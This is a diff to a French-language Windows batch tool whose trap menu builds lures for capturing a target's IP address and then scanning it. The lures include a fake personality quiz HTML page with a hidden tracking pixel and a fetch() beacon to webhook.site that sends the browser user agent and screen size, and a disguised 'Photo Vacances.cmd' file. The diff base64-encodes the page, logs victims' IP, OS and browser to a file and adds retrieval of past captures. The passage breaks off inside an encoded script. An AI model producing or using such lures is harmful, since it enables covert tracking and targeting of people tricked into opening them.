@@ -1619,8 +1619,8 @@ if exist "%CAP_IPS%"  del /f /q "%CAP_IPS%"
 >>"%CAP_PS%" echo if (-not (Test-Path $f)) { exit 1 }
 >>"%CAP_PS%" echo $seen=@{}; $entries=@()
 >>"%CAP_PS%" echo foreach ($l in (Get-Content $f -EA SilentlyContinue)) {
->>"%CAP_PS%" echo     if ($l -match "IP: ([^\s]+)\s+(?:--|\|)\s+PC: ([^\s]+)\s+(?:--|\|)\s+User: (.+?)[\s]*$") {
->>"%CAP_PS%" echo         $ip=$matches[1]; $pc=$matches[2]; $usr=$matches[3].Trim()
+>>"%CAP_PS%" echo     if ($l -match "IP: (\S+)\s+(?:--|\|)\s+PC: (.+?)\s+(?:--|\|)\s+User: (.+?)(?:\s+--.*)?$") {
+>>"%CAP_PS%" echo         $ip=$matches[1]; $pc=$matches[2].Trim(); $usr=$matches[3].Trim()
 >>"%CAP_PS%" echo         if (-not $seen[$ip]) { $seen[$ip]=$true; $entries += @{IP=$ip;PC=$pc;USR=$usr} }
 >>"%CAP_PS%" echo     } }
 >>"%CAP_PS%" echo $entries = $entries ^| Select-Object -Last 9
@@ -1716,13 +1716,14 @@ set "base_ip=AUTO"
 goto start_lan_scan
 
 :gm_traps_menu
-set "trap_q=PIEGE CMD - Fichier .cmd piege - la cible double-clique~Photo Vacances.cmd son IP arrive ici automatiquement;PIXEL HTML - Page web piege - la cible ouvre un lien~Envoyez par Discord ou email aucun clic suspect;PIEGE NTFY - Notif instantanee sur navigateur/mobile~La cible execute le CMD vous recevez l'IP sur ntfy.sh"
+set "trap_q=PIEGE CMD - Fichier .cmd piege - la cible double-clique~Photo Vacances.cmd son IP arrive ici automatiquement;PIXEL HTML - Page web piege - la cible ouvre un lien~Envoyez par Discord ou email aucun clic suspect;PIEGE NTFY - Notif instantanee sur navigateur/mobile~La cible execute le CMD vous recevez l'IP sur ntfy.sh;Recuperer captures passees~Script ferme trop tot ? Recuperez les IP capturees en votre absence"
 call :DynamicMenu "CHOISIR UN PIEGE POUR CAPTURER SON IP" "%trap_q%" "NONUMS"
 set "gm_ch=%errorlevel%"
 if "%gm_ch%"=="0" goto cyber_ip_grabber
 if "%gm_ch%"=="1" goto gm_webhook_trap
 if "%gm_ch%"=="2" goto gm_pixel_html
 if "%gm_ch%"=="3" goto gm_email_trap
+if "%gm_ch%"=="4" goto gm_retrieve_past
 goto gm_traps_menu
 if "%gm_ch%"=="5" goto gm_manual_ip
 goto gm_traps_menu
@@ -1843,9 +1844,12 @@ set "CAPFILE=%TEMP%\captured_ip.txt"
 >> "%PS_HTML%" echo   $id = $tk.uuid; if (-not $id) { throw 'UUID vide' }
 >> "%PS_HTML%" echo   $url = 'https://webhook.site/' + $id
 >> "%PS_HTML%" echo   $api = 'https://webhook.site/token/' + $id + '/requests'
+>> "%PS_HTML%" echo   Add-Content '%~dp0webhook_tokens.txt' -Value ((Get-Date -Format 'dd/MM HH:mm') + ';' + $api) -Encoding ASCII
 >> "%PS_HTML%" echo   $desk = [Environment]::GetFolderPath('Desktop') + '\Quiz_Personnalite.html'
->> "%PS_HTML%" echo   $html = "<!DOCTYPE html><html lang='fr'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Quel type de personne es-tu ?</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Segoe UI,Tahoma,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center}div.card{background:#fff;border-radius:20px;padding:36px;max-width:560px;width:92%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}.icon{font-size:52px;margin-bottom:14px}h1{color:#333;font-size:23px;margin-bottom:8px}p.sub{color:#aaa;margin-bottom:22px;font-size:13px}div.prog{height:6px;background:#eee;border-radius:3px;margin-bottom:26px}div.bar{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:3px;transition:width .4s}p.qtxt{font-size:16px;font-weight:600;color:#444;margin-bottom:18px;line-height:1.5}div.opts{display:flex;flex-direction:column;gap:9px}div.opt{padding:13px 16px;border:2px solid #ebebeb;border-radius:11px;cursor:pointer;transition:all .2s;font-size:14px;text-align:left}div.opt:hover{border-color:#667eea;background:#f6f3ff;transform:translateX(4px)}p.ctr{color:#ccc;font-size:11px;margin-top:10px}span.ri{font-size:64px;display:block;margin-bottom:10px}div.rt{font-size:26px;font-weight:700;color:#333;margin:10px 0}p.rd{color:#777;font-size:14px;line-height:1.7;margin-bottom:22px}button.btn{padding:13px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:24px;font-size:14px;cursor:pointer;font-weight:600;box-shadow:0 4px 15px rgba(102,126,234,.4)}button.btn:hover{transform:translateY(-2px)}</style></head><body><img src='$url' width='1' height='1' style='display:none'><div class='card' id='app'><div class='icon'>&#129504;</div><h1>Quel type de personne es-tu ?</h1><p class='sub'>4 questions pour tout savoir sur ta personnalite</p><div class='prog'><div class='bar' id='b' style='width:0%'></div></div><p class='qtxt' id='q'></p><div class='opts' id='o'></div><p class='ctr' id='c'></p></div><script>try{fetch('$url/'+navigator.platform+'/'+screen.width+'x'+screen.height)}catch(e){}var qs=[{q:'Un meme arrive a 2h du matin. Tu :',a:['Reponds direct \uD83D\uDCAC','Like sans repondre \uD83D\uDC4D','Vois ca le lendemain \uD83D\uDE34','Notifs coupees depuis longtemps \uD83D\uDD15']},{q:'Quelqu\u0027un finit le dentifrice sans rien racheter. Tu :',a:['L\u0027utilises quand meme \uD83D\uDE24','Rachetes en silence \uD83D\uDED2','L\u0027ecrases dans tous les sens \uD83D\uDE03','En parles a tout le monde \uD83D\uDCE3']},{q:'Ta methode pour les series :',a:['Tout enchainer en une nuit \uD83C\uDFAC','Pause toutes les 10 minutes \uD83D\uDCF1','Tel en main pendant l\u0027episode \uD83D\uDE05','Tu t\u0027endors a chaque fois \uD83D\uDCA4']},{q:'Quelqu\u0027un dit on doit parler. Tu :',a:['Rappelles direct \uD83D\uDE30','Prepares ta defense \uD83D\uDE2C','Attends qu\u0027il rappelle \uD83D\uDE10','Fais semblant de pas avoir vu \uD83D\uDE48']}];var rs=[{e:'\uD83E\uDDA5',t:'Le Seigneur du Calme',d:'Tu prends la vie comme elle vient. Rien ne te stresse vraiment \u2014 ou du moins tu le caches bien. Les gens t\u0027envient sans te le dire.'},{e:'\uD83E\uDD8A',t:'Le Renard Stratege',d:'Tu observes avant d\u0027agir. Toujours deux longueurs d\u0027avance. Les autres croient comprendre tes plans... ils ont tort.'},{e:'\uD83D\uDC3A',t:'Le Loup Sociable',d:'Tu apprecies les gens mais tu as besoin de ton espace. Tu choisis tes batailles et ton energie. Rare et precieux.'},{e:'\uD83E\uDD81',t:'Le Lion de Canape',d:'Puissant quand tu le decides vraiment. La sieste est ton super-pouvoir et personne ne peut te juger pour ca.'}];var i=0,s=0;function go(){document.getElementById('b').style.width=(i/qs.length*100)+'%';document.getElementById('q').textContent=qs[i].q;document.getElementById('c').textContent='Question '+(i+1)+' / '+qs.length;var o=document.getElementById('o');o.innerHTML='';qs[i].a.forEach(function(t,j){var d=document.createElement('div');d.className='opt';d.textContent=t;d.onclick=function(){s+=j;i++;i<qs.length?go():fin()};o.appendChild(d)})}function fin(){var r=rs[Math.min(Math.round(s/qs.length),rs.length-1)];window._rt=r.t+' '+r.e;document.getElementById('app').innerHTML='<span class=ri>'+r.e+'</span><div class=rt>'+r.t+'</div><p class=rd>'+r.d+'</p><br><button class=btn onclick=\'alert(window._rt)\'>Partager mon resultat \uD83D\uDD17</button>'}go()</script></body></html>"
->> "%PS_HTML%" echo   Set-Content -Path $desk -Value $html -Encoding UTF8
+>> "%PS_HTML%" echo   $b64 = 'PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZnIiPjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSI+PHRpdGxlPlF1ZWwgdHlwZSBkZSBwZXJzb25uZSBlcy10dSA/PC90aXRsZT48c3R5bGU+Kntib3gtc2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjA7cGFkZGluZzowfWJvZHl7Zm9udC1mYW1pbHk6U2Vnb2UgVUksVGFob21hLHNhbnMtc2VyaWY7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCM2NjdlZWEsIzc2NGJhMik7bWluLWhlaWdodDoxMDB2aDtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7cGFkZGluZzoyMHB4fS5jYXJke2JhY2tncm91bmQ6I2ZmZjtib3JkZXItcmFkaXVzOjI0cHg7cGFkZGluZzo0MHB4IDM2cHg7bWF4LXdpZHRoOjU0MHB4O3dpZHRoOjEwMCU7Ym94LXNoYWRvdzowIDI0cHggNjRweCByZ2JhKDAsMCwwLC4yKTt0ZXh0LWFsaWduOmNlbnRlcn0udG9we2ZvbnQtc2l6ZTo1MnB4O21hcmdpbi1ib3R0b206MTRweH1oMXtmb250LXNpemU6MjRweDtmb250LXdlaWdodDo4MDA7Y29sb3I6IzFhMWEyZTttYXJnaW4tYm90dG9tOjZweH0uc3Vie2NvbG9yOiM5YjliOWI7Zm9udC1zaXplOjE0cHg7bWFyZ2luLWJvdHRvbToyOHB4fS5wYmd7aGVpZ2h0OjZweDtiYWNrZ3JvdW5kOiNmMGYwZjA7Ym9yZGVyLXJhZGl1czozcHg7bWFyZ2luLWJvdHRvbTozMnB4O292ZXJmbG93OmhpZGRlbn0ucGJhcntoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCg5MGRlZywjNjY3ZWVhLCM3NjRiYTIpO2JvcmRlci1yYWRpdXM6M3B4O3RyYW5zaXRpb246d2lkdGggLjRzIGVhc2U7d2lkdGg6MCV9LnF0eHR7Zm9udC1zaXplOjE3cHg7Zm9udC13ZWlnaHQ6NjAwO2NvbG9yOiMyZDJkMmQ7bWFyZ2luLWJvdHRvbToyMHB4O2xpbmUtaGVpZ2h0OjEuNX0ub3B0c3tkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2dhcDoxMHB4O21hcmdpbi1ib3R0b206MTZweH0ub3B0e3BhZGRpbmc6MTRweCAxOHB4O2JvcmRlcjoycHggc29saWQgI2ViZWJlYjtib3JkZXItcmFkaXVzOjEycHg7Y3Vyc29yOnBvaW50ZXI7Zm9udC1zaXplOjE0cHg7dGV4dC1hbGlnbjpsZWZ0O3RyYW5zaXRpb246YWxsIC4ycztmb250LWZhbWlseTppbmhlcml0O2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojMzMzO3dpZHRoOjEwMCV9Lm9wdDpob3Zlcntib3JkZXItY29sb3I6IzY2N2VlYTtiYWNrZ3JvdW5kOiNmNWYzZmY7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoNHB4KX0uY3Rye2NvbG9yOiNjMGMwYzA7Zm9udC1zaXplOjEycHh9LnJle2ZvbnQtc2l6ZTo3MnB4O21hcmdpbi1ib3R0b206MTZweH0ucnR7Zm9udC1zaXplOjI2cHg7Zm9udC13ZWlnaHQ6ODAwO2NvbG9yOiMxYTFhMmU7bWFyZ2luLWJvdHRvbToxNHB4fS5yZHtjb2xvcjojNjY2O2ZvbnQtc2l6ZToxNXB4O2xpbmUtaGVpZ2h0OjEuOH08L3N0eWxlPjwvaGVhZD48Ym9keT48aW1nIHNyYz0iVVJMUExBQ0VIT0xERVIiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHN0eWxlPSJwb3NpdGlvbjpmaXhlZDt0b3A6LTk5OTlweCI+PGRpdiBjbGFzcz0iY2FyZCIgaWQ9ImNhcmQiPjxkaXYgY2xhc3M9InRvcCI+JiN4MUY5RTA7PC9kaXY+PGgxPlF1ZWwgdHlwZSBkZSBwZXJzb25uZSBlcy10dSA/PC9oMT48cCBjbGFzcz0ic3ViIj40IHF1ZXN0aW9ucyBwb3VyIHRvdXQgc2F2b2lyPC9wPjxkaXYgY2xhc3M9InBiZyI+PGRpdiBjbGFzcz0icGJhciIgaWQ9ImJhciI+PC9kaXY+PC9kaXY+PHAgY2xhc3M9InF0eHQiIGlkPSJxIj48L3A+PGRpdiBjbGFzcz0ib3B0cyIgaWQ9Im9wdHMiPjwvZGl2PjxwIGNsYXNzPSJjdHIiIGlkPSJjdHIiPjwvcD48L2Rpdj48c2NyaXB0PnRyeXtmZXRjaCgiVVJMUExBQ0VIT0xERVIvIitlbmNvZGVVUklDb21wb25lbnQobmF2aWdhdG9yLnVzZXJBZ2VudCkrIi8iK3NjcmVlbi53aWR0aCsieCIrc2NyZWVuLmhlaWdodCl9Y2F0Y2goeCl7fXZhciBxcz1be3E6IlVuIG1lc3NhZ2UgYXJyaXZlIMOgIDJoIGR1IG1hdGluLiBUdSA6IixvOlsiUsOpcG9uZHMgZGlyZWN0IPCfkqwiLCJMaWtlIHNhbnMgcsOpcG9uZHJlIPCfkY0iLCJWb2lzIMOnYSBsZSBsZW5kZW1haW4g8J+YtCIsIk5vdGlmcyBjb3Vww6llcyDwn5SVIl19LHtxOiJMZSBkZW50aWZyaWNlIGVzdCB2aWRlLCBwZXJzb25uZSBuZSByYWPDqHRlLiBUdSA6IixvOlsiTOKAmXV0aWxpc2VzIHF1YW5kIG3Dqm1lIPCfmKQiLCJSYWPDqHRlcyBlbiBzaWxlbmNlIPCfm5IiLCLDiWNyYXNlcyBkYW5zIHRvdXMgbGVzIHNlbnMg8J+YgyIsIkVuIHBhcmxlcyDDoCB0b3V0IGxlIG1vbmRlIPCfk6MiXX0se3E6IlRhIG3DqXRob2RlIHBvdXIgbGVzIHPDqXJpZXMgOiIsbzpbIlRvdXQgZW5jaMOiw65uZXIgZW4gdW5lIG51aXQg8J+OrCIsIlBhdXNlIHRvdXRlcyBsZXMgMTAgbWluIPCfk7EiLCJUw6lsIGVuIG1haW4gcGVuZGFudCBs4oCZw6lwaXNvZGUg8J+YhSIsIlR1IHTigJllbmRvcnMgw6AgY2hhcXVlIGZvaXMg8J+SpCJdfSx7cToiUXVlbHF14oCZdW4gZGl0IG9uIGRvaXQgcGFybGVyLiBUdSA6IixvOlsiUmFwcGVsbGVzIGRpcmVjdCDwn5iwIiwiUHLDqXBhcmVzIHRhIGTDqWZlbnNlIPCfmKwiLCJBdHRlbmRzIHF14oCZaWwgcmFwcGVsbGUg8J+YkCIsIkZhaXMgc2VtYmxhbnQgZGUgcGFzIHZvaXIg8J+ZiCJdfV07dmFyIHJzPVt7ZToi8J+mpSIsdDoiTGUgU2VpZ25ldXIgZHUgQ2FsbWUiLGQ6IlR1IHByZW5kcyBsYSB2aWUgY29tbWUgZWxsZSB2aWVudC4gUmllbiBuZSB0ZSBzdHJlc3NlIHZyYWltZW50IOKAlCBvdSBkdSBtb2lucyB0dSBsZSBjYWNoZXMgYmllbi4gTGVzIGdlbnMgdOKAmWVudmllbnQgc2FucyB0ZSBsZSBkaXJlLiJ9LHtlOiLwn6aKIix0OiJMZSBSZW5hcmQgU3RyYXTDqGdlIixkOiJUdSBvYnNlcnZlcyBhdmFudCBk4oCZYWdpci4gVG91am91cnMgZGV1eCBsb25ndWV1cnMgZOKAmWF2YW5jZS4gTGVzIGF1dHJlcyBjcm9pZW50IGNvbXByZW5kcmUgdGVzIHBsYW5z4oCmIGlscyBvbnQgdG9ydC4ifSx7ZToi8J+QuiIsdDoiTGUgTG91cCBTb2NpYWJsZSIsZDoiVHUgYXBwcsOpY2llcyBsZXMgZ2VucyBtYWlzIHR1IGFzIGJlc29pbiBkZSB0b24gZXNwYWNlLiBUdSBjaG9pc2lzIHRlcyBiYXRhaWxsZXMgZXQgdG9uIMOpbmVyZ2llLiBSYXJlIGV0IHByw6ljaWV1eC4ifSx7ZToi8J+mgSIsdDoiTGUgTGlvbiBkZSBDYW5hcMOpIixkOiJQdWlzc2FudCBxdWFuZCB0dSBsZSBkw6ljaWRlcyB2cmFpbWVudC4gTGEgc2llc3RlIGVzdCB0b24gc3VwZXItcG91dm9pciBldCBwZXJzb25uZSBuZSBwZXV0IHRlIGp1Z2VyIHBvdXIgw6dhLiJ9XTt2YXIgc3RlcD0wLHNjb3JlPTA7ZnVuY3Rpb24gcmVuZGVyKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJhciIpLnN0eWxlLndpZHRoPShzdGVwKjI1KSsiJSI7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInEiKS50ZXh0Q29udGVudD1xc1tzdGVwXS5xO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjdHIiKS50ZXh0Q29udGVudD0iUXVlc3Rpb24gIisoc3RlcCsxKSsiIC8gNCI7dmFyIG89ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm9wdHMiKTtvLmlubmVySFRNTD0iIjtmb3IodmFyIGk9MDtpPDQ7aSsrKXsoZnVuY3Rpb24obil7dmFyIGI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7Yi5jbGFzc05hbWU9Im9wdCI7Yi50ZXh0Q29udGVudD1xc1tzdGVwXS5vW25dO2Iub25jbGljaz1mdW5jdGlvbigpe3Njb3JlKz1uO3N0ZXArKztzdGVwPDQ/cmVuZGVyKCk6cmVzdWx0KCk7fTtvLmFwcGVuZENoaWxkKGIpO30pKGkpO319ZnVuY3Rpb24gcmVzdWx0KCl7dmFyIHI9cnNbTWF0aC5taW4oTWF0aC5yb3VuZChzY29yZS80KSwzKV07dmFyIGM9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNhcmQiKTtjLmlubmVySFRNTD0iIjt2YXIgZT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtlLmNsYXNzTmFtZT0icmUiO2UudGV4dENvbnRlbnQ9ci5lO2MuYXBwZW5kQ2hpbGQoZSk7dmFyIHQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7dC5jbGFzc05hbWU9InJ0Ijt0LnRleHRDb250ZW50PXIudDtjLmFwcGVuZENoaWxkKHQpO3ZhciBkPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2QuY2xhc3NOYW1lPSJyZCI7ZC50ZXh0Q29udGVudD1yLmQ7Yy5hcHBlbmRDaGlsZChkKTt9cmVuZGVyKCk7PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4='
+>> "%PS_HTML%" echo   $html = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) -replace 'URLPLACEHOLDER',$url
+>> "%PS_HTML%" echo   $enc = New-Object System.Text.UTF8Encoding($false)
+>> "%PS_HTML%" echo   [System.IO.File]::WriteAllText($desk, $html, $enc)
 >> "%PS_HTML%" echo   Write-Host '  [OK] Page HTML generee : Quiz_Personnalite.html' -f Green
 >> "%PS_HTML%" echo   Write-Host '  [i] Envoyez Quiz_Personnalite.html a votre cible (Discord, email, WhatsApp...)' -f Cyan
 >> "%PS_HTML%" echo   Write-Host '  [i] L''IP est captee des l''ouverture, avant meme qu''il reponde' -f Cyan
@@ -1861,12 +1865,24 @@ set "CAPFILE=%TEMP%\captured_ip.txt"
 >> "%PS_HTML%" echo       if (@($rs.data).Count -gt 0) {
 >> "%PS_HTML%" echo         $found = $true; $d = @($rs.data)[0]; $ip_val = $d.ip
 >> "%PS_HTML%" echo         $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
+>> "%PS_HTML%" echo         $ua_raw = if ($segs.Count -ge 2) { [uri]::UnescapeDataString($segs[-2]) } else { '?' }
+>> "%PS_HTML%" echo         $scr_val = if ($segs.Count -ge 1) { $segs[-1] } else { '?' }
+>> "%PS_HTML%" echo         $browser = if ($ua_raw -match 'Edg/') { 'Edge' } elseif ($ua_raw -match 'Chrome/') { 'Chrome' } elseif ($ua_raw -match 'Firefox/') { 'Firefox' } elseif ($ua_raw -match 'Safari/') { 'Safari' } else { 'Browser' }
+>> "%PS_HTML%" echo         $os = if ($ua_raw -match 'Windows NT 1[01]') { 'Win10-11' } elseif ($ua_raw -match 'Windows') { 'Windows' } elseif ($ua_raw -match 'Mac') { 'macOS' } elseif ($ua_raw -match 'Linux') { 'Linux' } elseif ($ua_raw -match 'Android') { 'Android' } elseif ($ua_raw -match 'iPhone^|iPad') { 'iOS' } else { 'OS?' }
+>> "%PS_HTML%" echo         $pc_val = $os + '-' + $browser + ' (' + $scr_val + ')'
 >> "%PS_HTML%" echo         Write-Host ''
 >> "%PS_HTML%" echo         Write-Host '  =================================================' -f Red
 >> "%PS_HTML%" echo         Write-Host ("  IP         : " + $ip_val) -f Cyan
->> "%PS_HTML%" echo         Write-Host ("  Plateforme : " + (if ($segs.Count -ge 2) { $segs[-2] } else { '?' })) -f White
->> "%PS_HTML%" echo         Write-Host ("  Ecran      : " + (if ($segs.Count -ge 1) { $segs[-1] } else { '?' })) -f White
+>> "%PS_HTML%" echo         Write-Host ("  OS/Browser : " + $pc_val) -f White
+>> "%PS_HTML%" echo         Write-Host ("  Ecran      : " + $scr_val) -f White
 >> "%PS_HTML%" echo         Write-Host '  =================================================' -f Red
+>> "%PS_HTML%" echo         $ipdist = '%~dp0ip distant.txt'
+>> "%PS_HTML%" echo         if (-not (Test-Path $ipdist)) { $null = New-Item $ipdist -ItemType File -Force }
+>> "%PS_HTML%" echo         if (-not (Select-String -Path $ipdist -Pattern ([regex]::Escape($ip_val)) -Quiet -EA SilentlyContinue)) {
+>> "%PS_HTML%" echo           $entry = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm') + '] IP: ' + $ip_val + ' -- PC: ' + $pc_val + ' -- User: inconnu'
+>> "%PS_HTML%" echo           Add-Content $ipdist -Value $entry -Encoding UTF8
+>> "%PS_HTML%" echo           Write-Host '  [+] Sauvegarde dans ip distant.txt' -f Green
+>> "%PS_HTML%" echo         }
 >> "%PS_HTML%" echo       }
 >> "%PS_HTML%" echo     } catch {}
 >> "%PS_HTML%" echo     if (-not $found) {
@@ -1882,7 +1898,7 @@ set "CAPFILE=%TEMP%\captured_ip.txt"
 >> "%PS_HTML%" echo   }
 >> "%PS_HTML%" echo   if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
 >> "%PS_HTML%" echo   if ($found) {
->> "%PS_HTML%" echo     Set-Content $capFile -Value "$ip_val;HTML;pixel" -Encoding ASCII
+>> "%PS_HTML%" echo     Set-Content $capFile -Value "$ip_val;$pc_val;" -Encoding ASCII
 >> "%PS_HTML%" echo     Write-Host '  [-^>] IP capturee ! Lancement du scan...' -f Green
 >> "%PS_HTML%" echo   }
 >> "%PS_HTML%" echo } catch { Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red }
@@ -1890,11 +1906,13 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_HTML%"
 if exist "%PS_HTML%" del /f /q "%PS_HTML%"
 if exist "%CAPFILE%" (
     set /p capture_data=<"%CAPFILE%"
-    for /f "tokens=1 delims=;" %%a in ("!capture_data!") do set "remote_ip=%%a"
+    for /f "tokens=1,2,3 delims=;" %%a in ("!capture_data!") do (
+        set "remote_ip=%%a"
+        set "remote_pc=%%b"
+        set "remote_user=%%c"
+    )
     del /f /q "%CAPFILE%"
     if defined remote_ip (
-        set "remote_pc=HTML-Tracker"
-chcp 65001 >nul
         echo  [-^>] IP capturee ! Scan automatique en cours...
         timeout /t 2 >nul
         goto wan_public_scan
@@ -1902,7 +1920,28 @@ chcp 65001 >nul
 )
 goto gm_traps_menu
 
-REM --- [4] Email Trap ---
+REM --- [4] Recuperer captures passees (tokens webhook sauvegardes) ---
+:gm_retrieve_past
+cls
+echo.
+echo  [*] RECUPERER LES CAPTURES PASSEES
+echo  [i] Consultation des tokens webhook.site sauvegardes...
+echo.
+if not exist "%~dp0webhook_tokens.txt" (
+    echo  [i] Aucun token sauvegarde. Generez d'abord un piege HTML ou WEBHOOK.
+    echo.
+    pause >nul
+    goto gm_traps_menu
+)
+set "PS_RTRV=%TEMP%\retrieve_%RANDOM%.ps1"
+set "RTRV_DIR=%~dp0"
+set "RTRV_DIR=%RTRV_DIR:~0,-1%"
+powershell -NoProfile -Command "$b='W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgokdG9rRmlsZSAgID0gJ1BBVEhQTEFDRUhPTERFUlx3ZWJob29rX3Rva2Vucy50eHQnCiRpcERpc3RhbnQgPSAnUEFUSFBMQUNFSE9MREVSXGlwIGRpc3RhbnQudHh0JwokZm91bmRUb3RhbCA9IDAKJGxpbmVzID0gQChHZXQtQ29udGVudCAkdG9rRmlsZSAtRUEgU2lsZW50bHlDb250aW51ZSkKaWYgKCRsaW5lcy5Db3VudCAtZXEgMCkgewogIFdyaXRlLUhvc3QgJyAgW2ldIEZpY2hpZXIgdG9rZW5zIHZpZGUuJyAtRm9yZWdyb3VuZENvbG9yIFllbGxvdwogICRudWxsID0gJEhvc3QuVUkuUmF3VUkuUmVhZEtleSgnTm9FY2hvLEluY2x1ZGVLZXlEb3duJykKICBleGl0Cn0KV3JpdGUtSG9zdCAoJyAgW2ldICcgKyAkbGluZXMuQ291bnQgKyAnIHRva2VuKHMpIGEgY29uc3VsdGVyLi4uJykgLUZvcmVncm91bmRDb2xvciBDeWFuCldyaXRlLUhvc3QgJycKZm9yZWFjaCAoJGxpbmUgaW4gJGxpbmVzKSB7CiAgJHBhcnRzID0gJGxpbmUgLXNwbGl0ICc7JwogIGlmICgkcGFydHMuQ291bnQgLWx0IDIpIHsgY29udGludWUgfQogICRkYXRlID0gJHBhcnRzWzBdOyAkYXBpID0gJHBhcnRzWzFdLlRyaW0oKQogIFdyaXRlLUhvc3QgKCcgID4+IFRva2VuIGR1ICcgKyAkZGF0ZSkgLUZvcmVncm91bmRDb2xvciBEYXJrWWVsbG93CiAgdHJ5IHsKICAgICRycyAgID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkYXBpIC1UaW1lb3V0U2VjIDggLUVBIFN0b3AKICAgICRkYXRhID0gQCgkcnMuZGF0YSkKICAgIGlmICgkZGF0YS5Db3VudCAtZXEgMCkgeyBXcml0ZS1Ib3N0ICcgICAgIEF1Y3VuZSB2aXNpdGUuJyAtRm9yZWdyb3VuZENvbG9yIERhcmtHcmF5OyBjb250aW51ZSB9CiAgICBmb3JlYWNoICgkZCBpbiAkZGF0YSkgewogICAgICBpZiAoLW5vdCAkZC5pcCkgeyBjb250aW51ZSB9CiAgICAgICRpcCA9ICRkLmlwCiAgICAgICRzZWdzID0gaWYgKCRkLnVybCkgeyAkZC51cmwuVHJpbVN0YXJ0KCcvJykuU3BsaXQoJy8nKSB9IGVsc2UgeyBAKCkgfQogICAgICAkdWFfcmF3ID0gaWYgKCRzZWdzLkNvdW50IC1nZSAyKSB7IHRyeSB7IFt1cmldOjpVbmVzY2FwZURhdGFTdHJpbmcoJHNlZ3NbLTJdKSB9IGNhdGNoIHsgJHNlZ3NbLTJdIH0gfSBlbHNlIHsgJycgfQogICAgICAkc2NyID0gaWYgKCRzZWdzLkNvdW50IC1nZSAxKSB7ICRzZWdzWy0xXSB9IGVsc2UgeyAnPycgfQogICAgICAkYnJvd3NlciA9IGlmICgkdWFfcmF3IC1tYXRjaCAnRWRnLycpIHsgJ0VkZ2UnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnQ2hyb21lLycpIHsgJ0Nocm9tZScgfSBlbHNlaWYgKCR1YV9yYXcgLW1hdGNoICdGaXJlZm94LycpIHsgJ0ZpcmVmb3gnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnU2FmYXJpLycpIHsgJ1NhZmFyaScgfSBlbHNlaWYgKCR1YV9yYXcpIHsgJ0Jyb3dzZXInIH0gZWxzZSB7ICdIVE1MLVRyYWNrZXInIH0KICAgICAgJG9zID0gaWYgKCR1YV9yYXcgLW1hdGNoICdXaW5kb3dzIE5UIDFbMDFdJykgeyAnV2luMTAtMTEnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnV2luZG93cycpIHsgJ1dpbmRvd3MnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnQW5kcm9pZCcpIHsgJ0FuZHJvaWQnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnaVBob25lfGlQYWQnKSB7ICdpT1MnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnTWFjJykgeyAnbWFjT1MnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnTGludXgnKSB7ICdMaW51eCcgfSBlbHNlaWYgKCR1YV9yYXcpIHsgJ09TPycgfSBlbHNlIHsgJ0hUTUwnIH0KICAgICAgJHBjID0gaWYgKCR1YV9yYXcpIHsgJG9zICsgJy0nICsgJGJyb3dzZXIgfSBlbHNlIHsgJ0hUTUwtVHJhY2tlcicgfQogICAgICAkdXNyID0gaWYgKCRzY3IgLW1hdGNoICd4JykgeyAkc2NyIH0gZWxzZSB7ICdwaXhlbCcgfQogICAgICAkZm91bmRUb3RhbCsrCiAgICAgIFdyaXRlLUhvc3QgKCcgICAgIElQIDogJyArICRpcCArICcgIHwgICcgKyAkcGMgKyAnICB8ICAnICsgJHVzcikgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRpcERpc3RhbnQpKSB7ICRu